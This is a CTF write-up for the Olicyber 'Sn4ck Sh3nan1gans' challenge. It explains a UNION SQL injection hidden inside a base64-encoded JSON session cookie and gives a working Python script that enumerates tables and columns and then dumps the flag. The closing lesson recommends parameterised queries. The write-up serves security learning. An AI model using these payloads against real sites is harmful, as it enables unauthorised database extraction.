---
title: "Sn4ck Sh3nan1gans — UNION SQL Injection via Base64 JSON Cookie"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "sqli", "cookie-manipulation", "base64", "union-based", "python"]
difficulty: "intermediate"
summary: "The server reads a base64-encoded JSON cookie containing an ID field and passes it unsanitised into a SQL query. Inject a UNION SELECT payload inside the JSON, re-encode as base64, and set the forged cookie to extract the flag in three phases."
---

## The Challenge

The snack shop stores the session cart (or preference) as a base64-encoded JSON cookie. The backend decodes it and runs `SELECT ... WHERE id = <cookie_id>`. None of the user-visible fields are injectable — the vulnerability is in the cookie.

## Approach

Three-phase UNION-based injection:

1. **Enumerate tables** — `UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database()`
2. **Enumerate columns** — `UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'flags'`
3. **Dump flag** — `UNION SELECT flag FROM flags`

Each payload is placed in the `ID` field of the JSON object, the whole JSON is base64-encoded, and the result is set as the cookie value.

## Solution

```python
import requests, base64, json

site = "http://sn4ck.challs.olicyber.it/"

def make_cookie(payload):
    data = json.dumps({"ID": payload})
    return base64.b64encode(data.encode()).decode()

session = requests.Session()

# Phase 1: enumerate tables
c1 = make_cookie("0 UNION SELECT table_name FROM information_schema.tables WHERE table_schema = database() -- ")
r1 = session.get(site, cookies={"session": c1})
print("TABLES:", r1.text)

# Phase 2: enumerate columns in 'flags'
c2 = make_cookie("0 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'flags' -- ")
r2 = session.get(site, cookies={"session": c2})
print("COLUMNS:", r2.text)

# Phase 3: extract flag
c3 = make_cookie("0 UNION SELECT flag FROM flags -- ")
r3 = session.get(site, cookies={"session": c3})
print("FLAG:", r3.text)
```

`make_cookie()` serialises the dict, base64-encodes it, and returns the cookie value. The `0 UNION SELECT` prefix ensures the original row is empty (no real ID=0) so only the injected row is returned.

## What I Learned

Cookie values that are base64-decoded and used in SQL queries without parameterisation are SQL-injectable. The encoding layer is not a sanitisation layer. All transport formats — cookies, headers, JSON — must treat their contents as untrusted input and use parameterised queries.
